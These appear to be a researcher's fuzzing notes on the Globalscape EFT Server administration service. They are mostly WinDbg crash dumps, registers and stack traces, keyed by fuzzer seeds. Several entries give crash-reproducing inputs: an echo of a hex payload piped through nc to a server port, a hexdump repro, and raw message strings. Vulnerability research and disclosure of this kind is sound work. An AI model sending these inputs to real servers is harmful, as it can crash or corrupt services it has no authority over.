echo -ne "\x61\x00\x00\x00\x7f\xff\x00\x00\x78\x9c\x8b\x73\x60\x60\x62\x64\x60\x60\x08\x08\x0e\x77\x61\x05\xd2\x2a\x40\xac\x00\xc4\x6d\x0e\x85\xf7\x2e\xbd\x9a\x27\x74\x75\x9d\x84\x43\xca\x11\x96\xb7\x07\x39\x2a\x36\xcf\x3b\xe6\x15\x7e\x4
c\x76\x5b\xaf\xa7\x0a\x77\xb7\xa3\x8b\x8f\x1f\x48\x3d\x17\x10\xff\xf9\xff\xff\x7f\x11\x43\x3e\x43\x1e\x83\xa3\xaf\x27\xd8\x14\x16\x06\x08\x00\x00\xbd\xe0\x19\x1a" | nc 172.16.166.170 1100

(156c.1e6c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Globalscape\EFT Server\cftpstes.exe
cftpstes!OPENSSL_Applink+0x2dbccb:
00007ff7`7734175b 418b440c04      mov     eax,dword ptr [r12+rcx+4] ds:0000016a`66ce6ffe=????????
0:097> r
rax=000000000003e8f2 rbx=000000000003e8ea rcx=000000000003e8ea
rdx=000000000200405e rsi=0000000000000000 rdi=0000000000000008
rip=00007ff77734175b rsp=0000005ce0a3f500 rbp=0000005ce0a3fbf9
 r8=00007ff776fd0000  r9=0000000000000001 r10=0000000000000003
r11=0000005ce0a3f4f0 r12=0000016a66ca8710 r13=0000005ce0a3f898
r14=000000000200405e r15=0000000000000000

-------------

seed = 924129880

Corrupts some state, but seems to crash after different amounts of packets, but
always in the same way. Weird!

First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Globalscape\EFT Server\cftpstes.exe
VCRUNTIME140!memcpy_repmovs+0xb:
00007ffb`5b0e12db f3a4            rep movs byte ptr [rdi],byte ptr [rsi]
0:097> r
rax=0000019ddce3c020 rbx=0000019ddce3c020 rcx=00000000000448b2
rdx=0000019ddaada8b2 rsi=0000019ddab06000 rdi=0000019ddce6776e
rip=00007ffb5b0e12db rsp=00000085622ff118 rbp=0000019ddaada8b2
 r8=0000000000070000  r9=0000019ddab4a8b2 r10=00007ffb5b0e0000
r11=0000000000000246 r12=0000019ddaa2d6c0 r13=00000085622ff5d8
r14=0000000000000000 r15=00000000fa7b0000
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
VCRUNTIME140!memcpy_repmovs+0xb:
00007ffb`5b0e12db f3a4            rep movs byte ptr [rdi],byte ptr [rsi]

0:097> k
 # Child-SP          RetAddr               Call Site
00 00000085`622ff118 00007ff7`7714405b     VCRUNTIME140!memcpy_repmovs+0xb [D:\a\_work\1\s\src\vctools\crt\vcruntime\src\string\amd64\memcpy.asm @ 40] 
01 00000085`622ff130 00007ff7`77341c2b     cftpstes!OPENSSL_Applink+0xde5cb
02 00000085`622ff170 00007ff7`77341640     cftpstes!OPENSSL_Applink+0x2dc19b
03 00000085`622ff330 00007ff7`7734169f     cftpstes!OPENSSL_Applink+0x2dbbb0
04 00000085`622ff400 00007ff7`7734169f     cftpstes!OPENSSL_Applink+0x2dbc0f
05 00000085`622ff4d0 00007ff7`7741a977     cftpstes!OPENSSL_Applink+0x2dbc0f
06 00000085`622ff5a0 00007ff7`7737430d     cftpstes!OPENSSL_Applink+0x3b4ee7
07 00000085`622ff8b0 00007ff7`772b4989     cftpstes!OPENSSL_Applink+0x30e87d
08 00000085`622ff9a0 00007ff7`770ef8f2     cftpstes!OPENSSL_Applink+0x24eef9
09 00000085`622ffa70 00007ff7`7715d87b     cftpstes!OPENSSL_Applink+0x89e62
0a 00000085`622ffba0 00007ffb`6df86b4c     cftpstes!OPENSSL_Applink+0xf7deb
0b 00000085`622ffbe0 00007ffb`6f9b4dd0     ucrtbase!thread_start<unsigned int (__cdecl*)(void *),1>+0x4c
0c 00000085`622ffc10 00007ffb`70a1e3db     KERNEL32!BaseThreadInitThunk+0x10
0d 00000085`622ffc40 00000000`00000000     ntdll!RtlUserThreadStart+0x2b

Last message: c01000003a0100004441544105000000ac000000a8000000313131313131313130303030303030303031303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030


---------------

seed = 4059707568

First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Globalscape\EFT Server\cftpstes.exe
VCRUNTIME140!memcpy+0x300:
00007ffb`5b0e15f0 c5fe6f0a        vmovdqu ymm1,ymmword ptr [rdx] ds:00000149`c48d8ff0=00
0:097> r
rax=00000149c61df060 rbx=000000000055f38e rcx=00000149c62fb080
rdx=00000149c48d8ff0 rsi=0000000000000007 rdi=0000002c057df488
rip=00007ffb5b0e15f0 rsp=0000002c057df2f8 rbp=00000149c61df060
 r8=000000000044336e  r9=ffffffffffffffe0 r10=00007ffb5b0e0000
r11=0000000000000246 r12=00000149c47ba610 r13=0000002c057df6d8
r14=00000000002af9c7 r15=00000149c47bcfd0
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
VCRUNTIME140!memcpy+0x300:
00007ffb`5b0e15f0 c5fe6f0a        vmovdqu ymm1,ymmword ptr [rdx] ds:00000149`c48d8ff0=00
0:097> k
 # Child-SP          RetAddr               Call Site
00 0000002c`057df2f8 00007ff7`77067a8b     VCRUNTIME140!memcpy+0x300 [D:\a\_work\1\s\src\vctools\crt\vcruntime\src\string\amd64\memcpy.asm @ 429] 
01 0000002c`057df300 00007ff7`77341922     cftpstes!OPENSSL_Applink+0x1ffb
02 0000002c`057df340 00007ff7`77341640     cftpstes!OPENSSL_Applink+0x2dbe92
03 0000002c`057df500 00007ff7`7734169f     cftpstes!OPENSSL_Applink+0x2dbbb0
04 0000002c`057df5d0 00007ff7`7741a977     cftpstes!OPENSSL_Applink+0x2dbc0f
05 0000002c`057df6a0 00007ff7`7737430d     cftpstes!OPENSSL_Applink+0x3b4ee7
06 0000002c`057df9b0 00007ff7`772b4989     cftpstes!OPENSSL_Applink+0x30e87d
07 0000002c`057dfaa0 00007ff7`770ef8f2     cftpstes!OPENSSL_Applink+0x24eef9
08 0000002c`057dfb70 00007ff7`7715d87b     cftpstes!OPENSSL_Applink+0x89e62
09 0000002c`057dfca0 00007ffb`6df86b4c     cftpstes!OPENSSL_Applink+0xf7deb
0a 0000002c`057dfce0 00007ffb`6f9b4dd0     ucrtbase!thread_start<unsigned int (__cdecl*)(void *),1>+0x4c
0b 0000002c`057dfd10 00007ffb`70a1e3db     KERNEL32!BaseThreadInitThunk+0x10
0c 0000002c`057dfd40 00000000`00000000     ntdll!RtlUserThreadStart+0x2b

Repro:

00000000  74 00 00 00 7f ff 00 00  78 9c 2b 62 60 60 62 74  |t.......x.+b``bt|
00000010  60 60 08 08 0e 77 61 05  b2 55 80 58 01 88 fd 7a  |``...wa..U.X...z|
00000020  8c 8d a6 ed 54 59 e7 c7  f3 a0 b1 e2 e4 c4 7b 2b  |....TY........{+|
00000030  17 6f 5f ca ff 29 e0 71  4c cc 86 e4 54 55 e7 99  |.o_..).qL...TU..|
00000040  8e 2e 3e 7e 20 f5 72 40  fc e9 ff ff ff 7e 0c f9  |..>~ .r@.....~..|
00000050  0c 25 0c be 0c 95 0c a1  0c c5 0c a9 0c 45 0c 79  |.%...........E.y|
00000060  0c 89 0c b9 40 96 a3 af  27 d8 64 16 06 08 00 00  |....@...'.d.....|
00000070  26 0c 1d 9f                                       |&...|

740000007fff0000789c2b6260606274606008080e776105b25580580188fd7a8c8da6ed5459e7c7f3a0b1e2e4c47b2b176f5fcaff29e0714ccc86e45455e7998e2e3e7e20f57240fce9ffffff7e0cf90c250cbe0c950ca10cc50ca90c450c790c890cb94096a3af27d8641606080000260c1d9f

-------------------

seed = 3004518680
Not reproducable?

(ffc.668): Break instruction exception - code 80000003 (first chance)
ntdll!DbgBreakPoint:
00007ffb`70a43020 cc              int     3
0:100> g
(ffc.d58): C++ EH exception - code e06d7363 (first chance)
(ffc.d58): C++ EH exception - code e06d7363 (first chance)
(ffc.d58): C++ EH exception - code e06d7363 (first chance)
(ffc.d58): C++ EH exception - code e06d7363 (first chance)
(ffc.d58): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Globalscape\EFT Server\cftpstes.exe
cftpstes!OPENSSL_Applink+0x2dbcc2:
00007ff7`77341752 458b3c0c        mov     r15d,dword ptr [r12+rcx] ds:000001ee`ceadbffe=????????
0:097> r
rax=0000000000023e26 rbx=0000000000023e1e rcx=0000000000023e1e
rdx=0000000040000072 rsi=0000000000000000 rdi=0000000000000008
rip=00007ff777341752 rsp=0000000c05d7ef30 rbp=0000000c05d7f629
 r8=00007ff776fd0000  r9=0000000000000001 r10=0000000000000003
r11=0000000c05d7ef20 r12=000001eeceab81e0 r13=0000000c05d7f2c8
r14=0000000040000072 r15=0000000030000000
iopl=0         nv up ei ng nz na po cy
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
cftpstes!OPENSSL_Applink+0x2dbcc2:
00007ff7`77341752 458b3c0c        mov     r15d,dword ptr [r12+rcx] ds:000001ee`ceadbffe=????????
0:097> k
 # Child-SP          RetAddr               Call Site
00 0000000c`05d7ef30 00007ff7`77341640     cftpstes!OPENSSL_Applink+0x2dbcc2
01 0000000c`05d7f0f0 00007ff7`7734169f     cftpstes!OPENSSL_Applink+0x2dbbb0
02 0000000c`05d7f1c0 00007ff7`7741a977     cftpstes!OPENSSL_Applink+0x2dbc0f
03 0000000c`05d7f290 00007ff7`7737430d     cftpstes!OPENSSL_Applink+0x3b4ee7
04 0000000c`05d7f5a0 00007ff7`772b4989     cftpstes!OPENSSL_Applink+0x30e87d
05 0000000c`05d7f690 00007ff7`770ef8f2     cftpstes!OPENSSL_Applink+0x24eef9
06 0000000c`05d7f760 00007ff7`7715d87b     cftpstes!OPENSSL_Applink+0x89e62
07 0000000c`05d7f890 00007ffb`6df86b4c     cftpstes!OPENSSL_Applink+0xf7deb
08 0000000c`05d7f8d0 00007ffb`6f9b4dd0     ucrtbase!thread_start<unsigned int (__cdecl*)(void *),1>+0x4c
09 0000000c`05d7f900 00007ffb`70a1e3db     KERNEL32!BaseThreadInitThunk+0x10
0a 0000000c`05d7f930 00000000`00000000     ntdll!RtlUserThreadStart+0x2b


--------------------

seed = 3431076014
msg = 740000007fff0000789c2b6260786064606008080e776105d22a40ac00c47e3dc646d376aaacf3e379d0587172e2bd958bb72fe5ff14f03826664372aaaaf34c47171f3f907a3920fef4ffff7f3f867c8612065f864a8650866286548622863c8644865c20cbd1d7136c320b03040000268c1d9f

First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Globalscape\EFT Server\cftpstes.exe
VCRUNTIME140!memcpy+0x309:
00007ff8`0ddc15f9 c5fe6f5a40      vmovdqu ymm3,ymmword ptr [rdx+40h] ds:000001e7`e7118ff4=00
0:089> r
rax=000001e7e8906060 rbx=000001e7e8906060 rcx=000001e7e8b40780
rdx=000001e7e7118fb4 rsi=0000000000610063 rdi=000000346257f620
rip=00007ff80ddc15f9 rsp=000000346257f4c8 rbp=000001e7e6ede894
 r8=00000000003d5943  r9=ffffffffffffffe0 r10=00007ff80ddc0000
r11=0000000000000246 r12=000001e7e6eda480 r13=0000000000000200
r14=0000000000000000 r15=0000000000610063
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
VCRUNTIME140!memcpy+0x309:
00007ff8`0ddc15f9 c5fe6f5a40      vmovdqu ymm3,ymmword ptr [rdx+40h] ds:000001e7`e7118ff4=00
0:089> k
 # Child-SP          RetAddr               Call Site
00 00000034`6257f4c8 00007ff6`d3e1405b     VCRUNTIME140!memcpy+0x309 [D:\a\_work\1\s\src\vctools\crt\vcruntime\src\string\amd64\memcpy.asm @ 431] 
01 00000034`6257f4d0 00007ff6`d4011dc7     cftpstes!OPENSSL_Applink+0xde5cb
02 00000034`6257f510 00007ff6`d4011640     cftpstes!OPENSSL_Applink+0x2dc337
03 00000034`6257f6d0 00007ff6`d401169f     cftpstes!OPENSSL_Applink+0x2dbbb0
04 00000034`6257f7a0 00007ff6`d40ea977     cftpstes!OPENSSL_Applink+0x2dbc0f
05 00000034`6257f870 00007ff6`d404430d     cftpstes!OPENSSL_Applink+0x3b4ee7
06 00000034`6257fb80 00007ff6`d3f84989     cftpstes!OPENSSL_Applink+0x30e87d
07 00000034`6257fc70 00007ff6`d3dbf8f2     cftpstes!OPENSSL_Applink+0x24eef9
08 00000034`6257fd40 00007ff6`d3e2d87b     cftpstes!OPENSSL_Applink+0x89e62
09 00000034`6257fe70 00007ff8`1ac06b4c     cftpstes!OPENSSL_Applink+0xf7deb
0a 00000034`6257feb0 00007ff8`1bdb4dd0     ucrtbase!thread_start<unsigned int (__cdecl*)(void *),1>+0x4c
0b 00000034`6257fee0 00007ff8`1d69e3db     KERNEL32!BaseThreadInitThunk+0x10
0c 00000034`6257ff10 00000000`00000000     ntdll!RtlUserThreadStart+0x2b


